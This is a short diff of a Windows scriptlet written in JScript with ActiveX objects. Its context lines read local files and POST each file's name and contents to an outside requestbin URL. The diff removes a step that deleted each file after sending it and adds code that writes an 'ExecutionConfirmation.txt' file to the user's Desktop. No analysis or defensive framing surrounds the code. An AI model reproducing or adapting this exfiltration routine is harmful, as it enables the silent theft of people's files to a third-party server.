@@ -25,9 +25,6 @@
                     http.open("POST", "http://requestbin.whapi.cloud/1cvbzjl1", false);
                     http.setRequestHeader("Content-Type", "text/plain");
                     http.send("FileName: " + file.Name + "\nContent: " + content);
-                    
-                    // Suppression du fichier
-                    file.Delete(true);
                 }
             }
         ]]>
@@ -42,7 +39,15 @@
 
     function Exec() {
         var shell = new ActiveXObject("WScript.Shell");
-        shell.Popup("File processing completed.", 0, "Scriptlet", 64);
+        var desktopPath = shell.SpecialFolders("Desktop");
+        var confirmationFilePath = desktopPath + "\\ExecutionConfirmation.txt";
+        
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var confirmationFile = fso.CreateTextFile(confirmationFilePath, true);
+        confirmationFile.WriteLine("The scriptlet executed successfully.");
+        confirmationFile.Close();
+        
+        shell.Popup("File processing completed. Confirmation file created on Desktop.", 0, "Scriptlet", 64);
     }
 
 ]]>
